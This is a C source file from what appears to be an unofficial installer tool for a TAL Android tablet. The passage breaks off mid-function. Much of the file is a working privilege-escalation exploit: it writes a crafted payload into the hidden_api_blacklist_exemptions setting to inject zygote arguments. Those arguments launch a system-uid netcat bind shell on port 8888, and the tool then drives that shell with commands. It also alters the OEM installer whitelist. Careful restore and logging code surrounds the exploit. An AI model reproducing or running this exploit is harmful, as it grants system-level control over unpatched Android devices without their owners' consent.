/*
 * Copyright (C) 2026 yoyicue
 * SPDX-License-Identifier: GPL-3.0-only
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

extern const unsigned char xpad_dex_start[];
extern const unsigned char xpad_dex_end[];
extern const unsigned char xpad_anchor_start[];
extern const unsigned char xpad_anchor_end[];

#define SU_SOCKET "/data/local/tmp/temp_su.sock"
#define HIDDEN_SETTING "hidden_api_blacklist_exemptions"
#define INSTALL_WHITELIST "install_package_whitelist"
#define SYSTEM_DEX "/data/user/0/com.android.settings/cache/xpad-installer/embedded.dex"
#define SYSTEM_APK "/data/user/0/com.android.settings/cache/xpad-installer/staged.apk"
#define ROOT_DEX "/data/local/tmp/.xpad-installer.dex"
#define ZNXRUN_APK "/data/local/tmp/.xpad-znxrun.apk"
#define ANCHOR_APK "/data/local/tmp/.xpad-installer-anchor.apk"
#define ANCHOR_PACKAGE "com.yoyicue.xpad2.installeranchor"
#define OEM_INSTALLER "com.tal.pad.znxxservice"
#define ZYGOTE_PORT 8888
#define TRANSFER_PORT 28889
#define ZYGOTE_WRITER_SIZE 8192
#define PAYLOAD_ENTRY_COUNT 3000
#define PRIMARY_TRIGGER_PACKAGE "com.android.settings"
#define PRIMARY_TRIGGER_ACTIVITY "com.android.settings/.Settings"
#define SECONDARY_TRIGGER_PACKAGE "com.tal.init.ota"
#define SECONDARY_TRIGGER_ACTIVITY "com.tal.init.ota/.MainActivity"
#define INCIDENT_ROOT "/data/local/tmp/.xpad-installer"
#define INCIDENT_LOG_DIR INCIDENT_ROOT "/logs"
#define HIDDEN_SETTING_BACKUP INCIDENT_ROOT "/hidden-setting-original"
#define CIRCUIT_BREAKER INCIDENT_ROOT "/31317-circuit-breaker-boot-id"

#ifndef XPAD_INSTALL_VERSION
#define XPAD_INSTALL_VERSION "development"
#endif

static volatile sig_atomic_t guarded_child = -1;
static int incident_fd = -1;
static char incident_path[PATH_MAX];

struct core_state {
  char boot_id[80];
  pid_t zygote64;
  pid_t zygote32;
  pid_t system_server;
  pid_t system_ui;
};

struct hidden_setting_guard {
  char *original;
  size_t original_len;
  int original_missing;
  int captured;
};

static struct core_state incident_baseline;
static struct hidden_setting_guard hidden_guard;

static void forward_guarded_signal(int signal_number) {
  pid_t child = (pid_t)guarded_child;
  if (child > 0) kill(child, signal_number);
}

static int write_all(int fd, const void *data, size_t len) {
  const unsigned char *p = data;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) return -1;
    p += n;
    len -= (size_t)n;
  }
  return 0;
}

static int write_file(const char *path, const void *data, size_t len, mode_t mode) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (fd < 0) return -1;
  int rc = write_all(fd, data, len);
  if (fchmod(fd, mode) != 0) rc = -1;
  if (fsync(fd) != 0) rc = -1;
  if (close(fd) != 0) rc = -1;
  return rc;
}

static int copy_file(const char *source, const char *target, mode_t mode) {
  int in = open(source, O_RDONLY | O_CLOEXEC);
  if (in < 0) return -1;
  int out = open(target, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (out < 0) { close(in); return -1; }
  char buffer[65536];
  int rc = 0;
  for (;;) {
    ssize_t n = read(in, buffer, sizeof(buffer));
    if (n < 0 && errno == EINTR) continue;
    if (n < 0) { rc = -1; break; }
    if (n == 0) break;
    if (write_all(out, buffer, (size_t)n) != 0) { rc = -1; break; }
  }
  if (fchmod(out, mode) != 0) rc = -1;
  close(in); close(out); return rc;
}

static int connect_tcp(int port) {
  int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return -1;
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons((uint16_t)port);
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    close(fd);
    return -1;
  }
  return fd;
}

static void shell_quote(char *out, size_t cap, const char *value) {
  size_t used = 0;
#define PUT(ch) do { if (used + 1 >= cap) goto done; out[used++] = (ch); } while (0)
  PUT('\'');
  for (; *value; value++) {
    if (*value == '\'') {
      PUT('\''); PUT('\\'); PUT('\''); PUT('\'');
    } else PUT(*value);
  }
  PUT('\'');
done:
  out[used] = 0;
#undef PUT
}

static pid_t spawn_command(char *const argv[], int quiet) {
  pid_t pid = fork();
  if (pid < 0) return -1;
  if (pid == 0) {
    if (quiet) {
      int dev_null = open("/dev/null", O_RDWR | O_CLOEXEC);
      if (dev_null >= 0) {
        dup2(dev_null, STDOUT_FILENO);
        dup2(dev_null, STDERR_FILENO);
        if (dev_null > STDERR_FILENO) close(dev_null);
      }
    }
    execv(argv[0], argv);
    _exit(127);
  }
  return pid;
}

static int wait_command(pid_t pid) {
  if (pid < 0) return 127;
  int status = 0;
  while (waitpid(pid, &status, 0) < 0) {
    if (errno != EINTR) return 127;
  }
  return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(status);
}

static int run_command(char *const argv[]) {
  return wait_command(spawn_command(argv, 0));
}

static int capture_command(char *const argv[], char **output) {
  int pipes[2];
  if (pipe(pipes) != 0) return 127;
  pid_t pid = fork();
  if (pid < 0) {
    close(pipes[0]); close(pipes[1]);
    return 127;
  }
  if (pid == 0) {
    close(pipes[0]);
    dup2(pipes[1], STDOUT_FILENO);
    dup2(pipes[1], STDERR_FILENO);
    if (pipes[1] > STDERR_FILENO) close(pipes[1]);
    execv(argv[0], argv);
    _exit(127);
  }
  close(pipes[1]);
  size_t used = 0, capacity = 4096;
  char *buffer = malloc(capacity);
  if (!buffer) {
    close(pipes[0]);
    kill(pid, SIGKILL);
    wait_command(pid);
    return 70;
  }
  for (;;) {
    if (used + 2048 + 1 > capacity) {
      if (capacity >= 131072) {
        free(buffer); close(pipes[0]); kill(pid, SIGKILL); wait_command(pid);
        return 70;
      }
      capacity *= 2;
      char *grown = realloc(buffer, capacity);
      if (!grown) {
        free(buffer); close(pipes[0]); kill(pid, SIGKILL); wait_command(pid);
        return 70;
      }
      buffer = grown;
    }
    ssize_t count = read(pipes[0], buffer + used, capacity - used - 1);
    if (count < 0 && errno == EINTR) continue;
    if (count < 0) {
      free(buffer); close(pipes[0]); kill(pid, SIGKILL); wait_command(pid);
      return 74;
    }
    if (count == 0) break;
    used += (size_t)count;
  }
  close(pipes[0]);
  buffer[used] = 0;
  *output = buffer;
  return wait_command(pid);
}

static void trim_output(char *value) {
  size_t len = strlen(value);
  while (len && (value[len - 1] == '\n' || value[len - 1] == '\r' ||
                 value[len - 1] == ' ' || value[len - 1] == '\t'))
    value[--len] = 0;
}

struct whitelist_guard {
  char *original;
  int original_missing;
  int changed;
};

static int csv_contains(const char *csv, const char *item) {
  if (!csv || !*csv) return 0;
  size_t item_len = strlen(item);
  const char *cursor = csv;
  while (*cursor) {
    while (*cursor == ' ' || *cursor == ',') cursor++;
    const char *end = strchr(cursor, ',');
    if (!end) end = cursor + strlen(cursor);
    const char *trimmed = end;
    while (trimmed > cursor && trimmed[-1] == ' ') trimmed--;
    if ((size_t)(trimmed - cursor) == item_len && !strncmp(cursor, item, item_len))
      return 1;
    cursor = *end ? end + 1 : end;
  }
  return 0;
}

static int settings_get_global(const char *name, char **value, int *missing) {
  char *const argv[] = {
    "/system/bin/settings", "get", "global", (char *)name, NULL
  };
  char *output = NULL;
  int rc = capture_command(argv, &output);
  if (rc != 0) {
    free(output);
    return rc;
  }
  trim_output(output);
  *missing = !*output || !strcmp(output, "null");
  if (*missing) output[0] = 0;
  *value = output;
  return 0;
}

static int settings_set_global(const char *name, const char *value, int missing) {
  if (missing) {
    char *const argv[] = {
      "/system/bin/settings", "delete", "global", (char *)name, NULL
    };
    return run_command(argv);
  }
  char *const argv[] = {
    "/system/bin/settings", "put", "global", (char *)name, (char *)value, NULL
  };
  return run_command(argv);
}

static int settings_get_global_exact(char **value, size_t *length, int *missing) {
  char *const argv[] = {
    "/system/bin/settings", "get", "global", HIDDEN_SETTING, NULL
  };
  char *output = NULL;
  int rc = capture_command(argv, &output);
  if (rc != 0) {
    free(output);
    return rc;
  }
  size_t len = strlen(output);
  /* settings(1) appends exactly one line feed; preserve every byte in the value. */
  if (len && output[len - 1] == '\n') output[--len] = 0;
  *missing = len == 0 || (len == 4 && !memcmp(output, "null", 4));
  if (*missing) {
    output[0] = 0;
    len = 0;
  }
  *value = output;
  *length = len;
  return 0;
}

static int ensure_incident_directories(void) {
  if (mkdir(INCIDENT_ROOT, 0700) != 0 && errno != EEXIST) return -1;
  if (chmod(INCIDENT_ROOT, 0700) != 0) return -1;
  if (mkdir(INCIDENT_LOG_DIR, 0700) != 0 && errno != EEXIST) return -1;
  return chmod(INCIDENT_LOG_DIR, 0700);
}

static int sync_incident_root(void) {
  int fd = open(INCIDENT_ROOT, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
  if (fd < 0) return -1;
  int rc = fsync(fd);
  close(fd);
  return rc;
}

static int persist_hidden_guard(const struct hidden_setting_guard *guard) {
  if (ensure_incident_directories() != 0) return -1;
  size_t size = guard->original_len + 1;
  unsigned char *content = malloc(size);
  if (!content) return -1;
  content[0] = guard->original_missing ? 'M' : 'P';
  if (guard->original_len)
    memcpy(content + 1, guard->original, guard->original_len);
  char temporary[PATH_MAX];
  snprintf(temporary, sizeof(temporary), "%s.tmp.%d", HIDDEN_SETTING_BACKUP, getpid());
  int rc = write_file(temporary, content, size, 0600);
  free(content);
  if (rc == 0 && rename(temporary, HIDDEN_SETTING_BACKUP) != 0) rc = -1;
  if (rc == 0 && sync_incident_root() != 0) rc = -1;
  if (rc != 0) unlink(temporary);
  return rc;
}

static int load_hidden_guard(struct hidden_setting_guard *guard) {
  memset(guard, 0, sizeof(*guard));
  int fd = open(HIDDEN_SETTING_BACKUP, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return errno == ENOENT ? 1 : -1;
  struct stat st;
  if (fstat(fd, &st) != 0 || st.st_size < 1 || st.st_size > 1024 * 1024) {
    close(fd);
    return -1;
  }
  size_t size = (size_t)st.st_size;
  unsigned char *content = malloc(size + 1);
  if (!content) {
    close(fd);
    return -1;
  }
  size_t used = 0;
  while (used < size) {
    ssize_t count = read(fd, content + used, size - used);
    if (count < 0 && errno == EINTR) continue;
    if (count <= 0) break;
    used += (size_t)count;
  }
  close(fd);
  if (used != size || (content[0] != 'M' && content[0] != 'P')) {
    free(content);
    return -1;
  }
  size_t value_len = size - 1;
  char *value = malloc(value_len + 1);
  if (!value) {
    free(content);
    return -1;
  }
  if (value_len) memcpy(value, content + 1, value_len);
  value[value_len] = 0;
  guard->original = value;
  guard->original_len = value_len;
  guard->original_missing = content[0] == 'M';
  guard->captured = 1;
  free(content);
  return 0;
}

static int apply_hidden_guard(const struct hidden_setting_guard *guard) {
  if (!guard->captured) return -1;
  int rc = settings_set_global(HIDDEN_SETTING, guard->original,
                               guard->original_missing);
  char *verified = NULL;
  size_t verified_len = 0;
  int verified_missing = 0;
  if (rc == 0)
    rc = settings_get_global_exact(&verified, &verified_len, &verified_missing);
  if (rc == 0 && (verified_missing != guard->original_missing ||
      verified_len != guard->original_len ||
      (!verified_missing && memcmp(verified, guard->original, verified_len)))) rc = 1;
  free(verified);
  return rc;
}

static void clear_hidden_guard(struct hidden_setting_guard *guard, int remove_backup) {
  free(guard->original);
  memset(guard, 0, sizeof(*guard));
  if (remove_backup) unlink(HIDDEN_SETTING_BACKUP);
}

static int restore_persisted_hidden_setting(void) {
  struct hidden_setting_guard persisted;
  int loaded = load_hidden_guard(&persisted);
  if (loaded != 0) return loaded;
  int rc = apply_hidden_guard(&persisted);
  clear_hidden_guard(&persisted, rc == 0);
  return rc == 0 ? 0 : -1;
}

static int capture_hidden_guard(void) {
  clear_hidden_guard(&hidden_guard, 0);
  int stale = restore_persisted_hidden_setting();
  if (stale < 0) return -1;
  if (settings_get_global_exact(&hidden_guard.original, &hidden_guard.original_len,
                                &hidden_guard.original_missing) != 0) return -1;
  hidden_guard.captured = 1;
  if (persist_hidden_guard(&hidden_guard) != 0) {
    clear_hidden_guard(&hidden_guard, 0);
    return -1;
  }
  return 0;
}

static int finish_hidden_guard(void) {
  int rc = apply_hidden_guard(&hidden_guard);
  clear_hidden_guard(&hidden_guard, rc == 0);
  return rc;
}

static int hidden_value_is_31317_payload(const char *value, size_t length) {
  return value && length > ZYGOTE_WRITER_SIZE && value[0] == '\n' &&
      strstr(value, "--setuid=1000") &&
      strstr(value, "toybox nc -s 127.0.0.1 -p 8888");
}

static int remove_recognized_payload(void) {
  char *current = NULL;
  size_t current_len = 0;
  int current_missing = 1;
  int rc = settings_get_global_exact(&current, &current_len, &current_missing);
  int recognized = rc == 0 && !current_missing &&
      hidden_value_is_31317_payload(current, current_len);
  free(current);
  if (rc != 0) return -1;
  if (!recognized) return 1;
  if (settings_set_global(HIDDEN_SETTING, "", 1) != 0) return -1;
  char *verified = NULL;
  size_t verified_len = 0;
  int verified_missing = 0;
  rc = settings_get_global_exact(&verified, &verified_len, &verified_missing);
  free(verified);
  return rc == 0 && verified_missing ? 0 : -1;
}

static pid_t pid_for_name(const char *name) {
  char *output = NULL;
  char *const argv[] = {"/system/bin/pidof", (char *)name, NULL};
  int rc = capture_command(argv, &output);
  if (rc != 0 || !output) {
    free(output);
    return -1;
  }
  trim_output(output);
  char *end = NULL;
  long value = strtol(output, &end, 10);
  int valid = end && end != output && value > 0;
  free(output);
  return valid ? (pid_t)value : -1;
}

static void read_boot_id(char *output, size_t capacity) {
  output[0] = 0;
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) return;
  ssize_t count = read(fd, output, capacity - 1);
  close(fd);
  if (count <= 0) return;
  output[count] = 0;
  trim_output(output);
}

static void capture_core_state(struct core_state *state) {
  memset(state, 0, sizeof(*state));
  read_boot_id(state->boot_id, sizeof(state->boot_id));
  state->zygote64 = pid_for_name("zygote64");
  state->zygote32 = pid_for_name("zygote");
  state->system_server = pid_for_name("system_server");
  state->system_ui = pid_for_name("com.android.systemui");
}

static int circuit_breaker_active(void) {
  char current[80];
  read_boot_id(current, sizeof(current));
  int fd = open(CIRCUIT_BREAKER, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  char saved[80] = {0};
  ssize_t count = read(fd, saved, sizeof(saved) - 1);
  close(fd);
  if (count > 0) {
    saved[count] = 0;
    trim_output(saved);
  }
  if (*current && !strcmp(current, saved)) return 1;
  unlink(CIRCUIT_BREAKER);
  return 0;
}

static void trip_circuit_breaker(void) {
  char boot_id[80];
  read_boot_id(boot_id, sizeof(boot_id));
  if (!*boot_id || ensure_incident_directories() != 0) return;
  write_file(CIRCUIT_BREAKER, boot_id, strlen(boot_id), 0600);
}

static int core_state_changed(const struct core_state *before,
                              const struct core_state *after) {
  return strcmp(before->boot_id, after->boot_id) ||
      before->zygote64 != after->zygote64 ||
      before->zygote32 != after->zygote32 ||
      before->system_server != after->system_server ||
      before->system_ui != after->system_ui;
}

static long long monotonic_millis(void) {
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return -1;
  return (long long)now.tv_sec * 1000 + now.tv_nsec / 1000000;
}

static int incident_open(void) {
  if (ensure_incident_directories() != 0) return -1;
  snprintf(incident_path, sizeof(incident_path), "%s/31317-%lld-%d.jsonl",
           INCIDENT_LOG_DIR, (long long)time(NULL), getpid());
  incident_fd = open(incident_path,
      O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
  if (incident_fd < 0) return -1;
  capture_core_state(&incident_baseline);
  fprintf(stderr, "xpad-install: 31317 incident log=%s\n", incident_path);
  return 0;
}

static void incident_event(const char *stage, int attempt, const char *result) {
  if (incident_fd < 0) return;
  struct core_state current;
  capture_core_state(&current);
  char *hidden = NULL;
  size_t hidden_len = 0;
  int hidden_missing = 1;
  size_t newline_count = 0;
  if (settings_get_global_exact(&hidden, &hidden_len, &hidden_missing) == 0)
    for (size_t i = 0; i < hidden_len; i++)
      if (hidden[i] == '\n') newline_count++;
  dprintf(incident_fd,
      "{\"ts\":%lld,\"monotonic_ms\":%lld,\"event\":\"%s\","
      "\"attempt\":%d,\"result\":\"%s\",\"boot_id\":\"%s\","
      "\"zygote64\":%d,\"zygote32\":%d,\"system_server\":%d,"
      "\"system_ui\":%d,\"baseline_boot_id\":\"%s\","
      "\"baseline_zygote64\":%d,\"baseline_zygote32\":%d,"
      "\"baseline_system_server\":%d,\"baseline_system_ui\":%d,"
      "\"hidden_state\":\"%s\",\"hidden_length\":%zu,"
      "\"hidden_newlines\":%zu}\n",
      (long long)time(NULL), monotonic_millis(), stage, attempt, result,
      current.boot_id, current.zygote64, current.zygote32,
      current.system_server, current.system_ui, incident_baseline.boot_id,
      incident_baseline.zygote64, incident_baseline.zygote32,
      incident_baseline.system_server, incident_baseline.system_ui,
      hidden_missing ? "missing" : "present", hidden_len, newline_count);
  fsync(incident_fd);
  free(hidden);
}

static int incident_core_check(const char *stage, int attempt) {
  struct core_state current;
  capture_core_state(&current);
  if (!core_state_changed(&incident_baseline, &current)) return 0;
  trip_circuit_breaker();
  incident_event(stage, attempt, "core-pid-changed");
  fprintf(stderr,
          "xpad-install: core process changed during 31317; ordinary reboot required\n");
  return 75;
}

static void incident_close(void) {
  if (incident_fd >= 0) {
    fsync(incident_fd);
    close(incident_fd);
  }
  incident_fd = -1;
}

static int prepare_whitelist(const char *package_name, struct whitelist_guard *guard) {
  memset(guard, 0, sizeof(*guard));
  int rc = settings_get_global(INSTALL_WHITELIST, &guard->original,
                               &guard->original_missing);
  if (rc != 0) {
    fprintf(stderr, "xpad-install: cannot read temporary installer whitelist\n");
    return rc;
  }
  if (!guard->original_missing && csv_contains(guard->original, package_name)) return 0;
  size_t original_len = guard->original_missing ? 0 : strlen(guard->original);
  size_t length = original_len + (original_len ? 1 : 0) + strlen(package_name) + 1;
  char *updated = malloc(length);
  if (!updated) return 70;
  snprintf(updated, length, "%s%s%s", original_len ? guard->original : "",
           original_len ? "," : "", package_name);
  rc = settings_set_global(INSTALL_WHITELIST, updated, 0);
  free(updated);
  if (rc != 0) {
    fprintf(stderr, "xpad-install: cannot prepare temporary installer whitelist\n");
    return rc;
  }
  guard->changed = 1;
  char *verified = NULL;
  int missing = 0;
  rc = settings_get_global(INSTALL_WHITELIST, &verified, &missing);
  int valid = rc == 0 && !missing && csv_contains(verified, package_name);
  free(verified);
  if (!valid) {
    fprintf(stderr, "xpad-install: temporary installer whitelist verification failed\n");
    return 1;
  }
  return 0;
}

static int restore_whitelist(struct whitelist_guard *guard) {
  int rc = 0;
  if (guard->changed) {
    rc = settings_set_global(INSTALL_WHITELIST, guard->original,
                             guard->original_missing);
    char *verified = NULL;
    int missing = 0;
    if (rc == 0) rc = settings_get_global(INSTALL_WHITELIST, &verified, &missing);
    if (rc == 0 && (missing != guard->original_missing ||
        (!missing && strcmp(verified, guard->original)))) rc = 1;
    free(verified);
  }
  free(guard->original);
  memset(guard, 0, sizeof(*guard));
  if (rc != 0)
    fprintf(stderr, "xpad-install: temporary installer whitelist restore failed\n");
  return rc;
}

static int parse_uid_text(const char *text, uid_t *uid) {
  if (!text || !*text || !uid) return -1;
  errno = 0;
  char *end = NULL;
  unsigned long value = strtoul(text, &end, 10);
  if (errno || end == text || value > UINT_MAX) return -1;
  while (*end == ' ' || *end == '\t') end++;
  if (*end != 0) return -1;
  *uid = (uid_t)value;
  return 0;
}

static int parse_package_uid(const char *output, const char *package_name,
                             uid_t *uid) {
  if (!output || !package_name || !*package_name || !uid) return -1;
  char marker[256];
  int marker_len = snprintf(marker, sizeof(marker), "package:%s uid:", package_name);
  if (marker_len < 0 || (size_t)marker_len >= sizeof(marker)) return -1;

  const char *line = output;
  while (*line) {
    const char *end = strpbrk(line, "\r\n");
    size_t line_len = end ? (size_t)(end - line) : strlen(line);
    if (line_len > (size_t)marker_len &&
        !strncmp(line, marker, (size_t)marker_len)) {
      size_t value_len = line_len - (size_t)marker_len;
      char value[32];
      if (value_len >= sizeof(value)) return -1;
      memcpy(value, line + marker_len, value_len);
      value[value_len] = 0;
      uid_t parsed = 0;
      if (parse_uid_text(value, &parsed) != 0 || parsed < 10000 || parsed >= 20000)
        return -1;
      *uid = parsed;
      return 0;
    }
    if (!end) break;
    line = end + 1;
    if (end[0] == '\r' && line[0] == '\n') line++;
  }
  return -1;
}

static int lookup_oem_installer_uid(uid_t *uid) {
  char *output = NULL;
  char *const argv[] = {
    "/system/bin/cmd", "package", "list", "packages", "-U", "--user", "0",
    OEM_INSTALLER, NULL
  };
  int rc = capture_command(argv, &output);
  int parsed = rc == 0 ? parse_package_uid(output, OEM_INSTALLER, uid) : -1;
  free(output);
  return parsed;
}

static int znxrun_status(int print_status) {
  uid_t expected_uid = 0;
  int expected_rc = lookup_oem_installer_uid(&expected_uid);

  char *uid_output = NULL;
  char *const uid_argv[] = {
    "/system/bin/run-as", "znxrun", "/system/bin/id", "-u", NULL
  };
  int alias_rc = capture_command(uid_argv, &uid_output);
  if (uid_output) trim_output(uid_output);
  uid_t alias_uid = 0;
  int alias_present = alias_rc == 0 && parse_uid_text(uid_output, &alias_uid) == 0;
  int alias_healthy = alias_present && expected_rc == 0 && alias_uid == expected_uid;
  int alias_invalid = alias_present && !alias_healthy;

  char *dump = NULL;
  char *const dump_argv[] = {
    "/system/bin/dumpsys", "package", ANCHOR_PACKAGE, NULL
  };
  int dump_rc = capture_command(dump_argv, &dump);
  const char *package_marker = "Package [" ANCHOR_PACKAGE "]";
  int anchor_installed = dump_rc == 0 && dump && strstr(dump, package_marker);
  char expected_source[512];
  int expected_len = expected_rc == 0 ? snprintf(
      expected_source, sizeof(expected_source),
      "installerPackageName=" OEM_INSTALLER "\n"
      "znxrun %u 1 /data/user/0/" OEM_INSTALLER " "
      "default:targetSdkVersion=28 none 0 0 1 @null",
      (unsigned)expected_uid) : -1;
  int anchor_persisted = anchor_installed && expected_len > 0 &&
      (size_t)expected_len < sizeof(expected_source) && strstr(dump, expected_source);

  const char *status = alias_healthy && anchor_persisted ? "healthy" :
      alias_invalid ? "invalid" : alias_healthy ? "legacy" : "missing";
  const char *alias = alias_healthy ? "healthy" : alias_invalid ? "invalid" : "missing";
  const char *anchor = anchor_persisted ? "anchored" :
      anchor_installed ? "unanchored" : "missing";
  if (print_status) {
    char actual_value[32] = "none";
    char expected_value[32] = "unavailable";
    if (alias_present) snprintf(actual_value, sizeof(actual_value), "%u", (unsigned)alias_uid);
    if (expected_rc == 0)
      snprintf(expected_value, sizeof(expected_value), "%u", (unsigned)expected_uid);
    printf("ZNXRUN_STATUS status=%s alias=%s uid=%s expected_uid=%s "
           "anchor=%s package=%s\n",
           status, alias, actual_value, expected_value, anchor, ANCHOR_PACKAGE);
  }
  free(uid_output);
  free(dump);
  return !strcmp(status, "healthy") ? 0 : 1;
}

static int wait_znxrun_healthy(int attempts, useconds_t interval_us) {
  for (int attempt = 1; attempt <= attempts; attempt++) {
    if (znxrun_status(0) == 0) {
      dprintf(STDOUT_FILENO, "ZNXRUN_SETTLE result=healthy attempt=%d\n", attempt);
      return 0;
    }
    unsigned long long elapsed_us =
        (unsigned long long)(attempt - 1) * (unsigned long long)interval_us;
    if (attempt == 1 || elapsed_us % 5000000ULL == 0)
      dprintf(STDOUT_FILENO,
              "ZNXRUN_SETTLE result=pending attempt=%d elapsed_seconds=%llu\n",
              attempt, elapsed_us / 1000000ULL);
    if (attempt < attempts) usleep(interval_us);
  }
  dprintf(STDOUT_FILENO, "ZNXRUN_SETTLE result=timeout attempts=%d\n", attempts);
  return 1;
}

#define ZNXRUN_ENSURE_PENDING 76

static int rpc(const char *command, int timeout_seconds) {
  int fd = connect_tcp(ZYGOTE_PORT);
  if (fd < 0) return 127;
  struct timeval tv = {.tv_sec = timeout_seconds, .tv_usec = 0};
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  char marker[80];
  snprintf(marker, sizeof(marker), "__XPAD_ELF_DONE_%d__", getpid());
  dprintf(fd, "%s; RC=$?; echo %s$RC\n", command, marker);
  shutdown(fd, SHUT_WR);
  char buffer[4096];
  char tail[256] = {0};
  int result = 124;
  for (;;) {
    ssize_t n = read(fd, buffer, sizeof(buffer));
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) break;
    write_all(STDOUT_FILENO, buffer, (size_t)n);
    size_t old = strlen(tail);
    size_t keep = (size_t)n < sizeof(tail) - old - 1 ? (size_t)n : sizeof(tail) - old - 1;
    memcpy(tail + old, buffer + n - keep, keep);
    tail[old + keep] = 0;
    if (strlen(tail) > 180) memmove(tail, tail + strlen(tail) - 180, 181);
    char *found = strstr(tail, marker);
    if (found) { result = atoi(found + strlen(marker)); break; }
  }
  close(fd);
  return result;
}

static char *build_zygote_payload(void) {
  const char *args[] = {
    "--runtime-args", "--setuid=1000", "--setgid=1000", "--setgroups=3003",
    "--mount-external-android-writable", "--runtime-flags=43267",
    "--target-sdk-version=29",
    "--seinfo=platform:system_app:targetSdkVersion=29:complete", "--invoke-with",
    "(toybox nc -s 127.0.0.1 -p 8888 -L /system/bin/sh -l)&",
    "--package-name=com.android.settings", "android.app.ActivityThread"
  };
  const size_t argument_count = sizeof(args) / sizeof(args[0]);
  char command[2048];
  int used = snprintf(command, sizeof(command), "%zu\n",
                      argument_count + PAYLOAD_ENTRY_COUNT);
  if (used < 0 || (size_t)used >= sizeof(command)) return NULL;
  for (size_t i = 0; i < argument_count; i++) {
    int count = snprintf(command + used, sizeof(command) - (size_t)used, "%s%s", args[i],
                         i + 1 == argument_count ? "" : "\n");
    if (count < 0 || (size_t)count >= sizeof(command) - (size_t)used) return NULL;
    used += count;
  }

  int prefix = snprintf(NULL, 0, "%d\n--set-api-denylist-exemptions\n",
                        PAYLOAD_ENTRY_COUNT + 1);
  if (prefix < 0 || (size_t)prefix + PAYLOAD_ENTRY_COUNT >= ZYGOTE_WRITER_SIZE) return NULL;
  size_t padding = ZYGOTE_WRITER_SIZE - (size_t)prefix - PAYLOAD_ENTRY_COUNT;
  size_t total = PAYLOAD_ENTRY_COUNT + padding + (size_t)used
      + (PAYLOAD_ENTRY_COUNT - 1) + 1;
  char *payload = malloc(total + 1);
  if (!payload) return NULL;
  char *p = payload;
  memset(p, '\n', PAYLOAD_ENTRY_COUNT); p += PAYLOAD_ENTRY_COUNT;
  memset(p, 'A', padding); p += padding;
  memcpy(p, command, (size_t)used); p += used;
  for (int i = 1; i < PAYLOAD_ENTRY_COUNT; i++) *p++ = ',';
  *p++ = 'X';
  *p = 0;
  return payload;
}

static int settings_put(const char *payload) {
  char *const argv[] = {
    "/system/bin/settings", "put", "global", HIDDEN_SETTING, (char *)payload, NULL
  };
  return wait_command(spawn_command(argv, 1));
}

static int settings_put_verified(const char *payload) {
  int rc = settings_put(payload);
  char *current = NULL;
  size_t current_len = 0;
  int current_missing = 1;
  if (rc == 0)
    rc = settings_get_global_exact(&current, &current_len, &current_missing);
  size_t payload_len = strlen(payload);
  if (rc == 0 && (current_missing || current_len != payload_len ||
                  memcmp(current, payload, payload_len))) rc = 1;
  free(current);
  return rc;
}

static void force_stop_package(const char *package_name) {
  char *const argv[] = {
    "/system/bin/am", "force-stop", (char *)package_name, NULL
  };
  wait_command(spawn_command(argv, 1));
}

static void start_alignment_triggers(void) {
  char *const primary[] = {
    "/system/bin/am", "start", "-n", PRIMARY_TRIGGER_ACTIVITY, NULL
  };
  char *const secondary[] = {
    "/system/bin/am", "start", "-n", SECONDARY_TRIGGER_ACTIVITY, NULL
  };
  pid_t primary_pid = spawn_command(primary, 1);
  pid_t secondary_pid = spawn_command(secondary, 1);
  int primary_status = wait_command(primary_pid);
  int secondary_status = wait_command(secondary_pid);
  fprintf(stderr, "xpad-install: zygote alignment primary=%d secondary=%d\n",
          primary_status, secondary_status);
}

static void cleanup_system_runner(void) {
  int fd = connect_tcp(ZYGOTE_PORT);
  if (fd < 0) return;
  const char command[] =
      "ME=$$; PARENT=$PPID; GP=$(awk '/^PPid:/ {print $2}' /proc/$PARENT/status 2>/dev/null); "
      "rm -f " SYSTEM_DEX " " SYSTEM_APK " " SYSTEM_DEX ".pid " SYSTEM_APK ".pid; "
      "kill -9 $GP $PARENT >/dev/null 2>&1\n";
  write_all(fd, command, sizeof(command) - 1);
  shutdown(fd, SHUT_WR);
  close(fd);
  sleep(1);
}

static int abort_31317_acquire(const char *stage, int attempt, int rc) {
  int restore_rc = hidden_guard.captured ? finish_hidden_guard() : 0;
  if (restore_rc != 0) {
    remove_recognized_payload();
    trip_circuit_breaker();
    rc = 75;
    incident_event("hidden-setting-restore", attempt, "failed");
    fprintf(stderr,
            "xpad-install: exact hidden setting restore failed; ordinary reboot required\n");
  } else {
    incident_event("hidden-setting-restore", attempt, "restored");
  }
  cleanup_system_runner();
  force_stop_package(PRIMARY_TRIGGER_PACKAGE);
  force_stop_package(SECONDARY_TRIGGER_PACKAGE);
  if (incident_core_check("abort-core-check", attempt) == 75) rc = 75;
  incident_event(stage, attempt, rc == 75 ? "reboot-required" : "failed");
  incident_close();
  return rc;
}

static int acquire_31317(void) {
  if (circuit_breaker_active()) {
    fprintf(stderr,
            "xpad-install: 31317 circuit breaker is active for this boot; ordinary reboot required\n");
    if (incident_open() == 0) {
      incident_event("circuit-breaker", 0, "reboot-required");
      incident_close();
    }
    return 75;
